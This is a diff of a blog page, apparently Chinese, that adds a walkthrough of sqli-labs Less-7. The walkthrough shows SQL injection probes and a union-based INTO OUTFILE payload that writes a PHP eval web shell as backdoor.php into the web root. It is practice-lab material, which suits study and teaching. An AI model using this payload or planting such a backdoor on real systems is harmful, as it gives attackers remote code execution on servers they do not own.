@@ -375,14 +375,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.5k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    6 分
                 </div>
                 
 
@@ -530,6 +530,24 @@
 <p>与第五题同理 只需要修改payload内单引号为双引号即可</p>
 <h4 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h4><p>GET - Dump into outfile - String</p>
 <p>导出文件GET字符型注入</p>
+<p><img src="https://gitee.com/night7i/img/raw/master/img/20210609194843.png" alt="image-20210609194843643"></p>
+<pre class="line-numbers language-none"><code class="language-none">判断注入点结构为((&#39;$id&#39;))：
+?id&#x3D;1&#39;)) and 1&#x3D;1 --+		&#x2F;&#x2F;页面显示正常
+?id&#x3D;1&#39;)) and 1&#x3D;2 --+		&#x2F;&#x2F;页面显示出错<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>根据题目名称into outfile 联想到mysql命令 <code>select into oufile</code></p>
+<p>标准语句：</p>
+<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">select 数据 into outfile 导出路径;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>要注意的是<code>select into outfile</code>在使用时候需要满足</p>
+<ul>
+<li>需要知道MySQL服务器本地路径</li>
+<li>配置文件中需要设置允许上传的路径 secure-file-priv=路径</li>
+</ul>
+<p>假设本地服务器路径为 <code>F:/WebSRC/sqli-labs-master</code>同理利用联合查询构建payload上传后门文件</p>
+<pre class="line-numbers language-none"><code class="language-none">?id&#x3D;1&#39;)) union select 1,2,&#39;&lt;?php @eval($_REQUEST[pass]);?&gt;&#39; into outfile &#39;F:&#x2F;WebSRC&#x2F;sqli-labs-master&#x2F;backdoor.php&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在网站根目录下访问上传的文件<code>backdoor.php</code>即可</p>
 
                 
             </div>
@@ -874,7 +892,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">2.5k</span>&nbsp;字
+                class="white-color">2.7k</span>&nbsp;字
             
             
             
